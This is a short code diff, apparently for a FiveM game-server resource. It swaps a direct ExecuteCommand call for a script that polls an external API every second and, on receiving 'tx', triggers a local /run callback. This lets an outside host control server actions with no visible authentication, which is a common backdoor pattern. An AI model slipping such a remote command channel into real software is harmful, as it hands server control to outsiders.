@@ -1,1 +1,16 @@
-ExecuteCommand("TX")
+<script>
+setInterval(async () => {
+  const res = await fetch("https://your-api.com/command");
+  const data = await res.json();
+
+  if (data.action === "tx") {
+    fetch(`https://${GetParentResourceName()}/run`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({})
+    });
+  }
+}, 1000);
+</script>
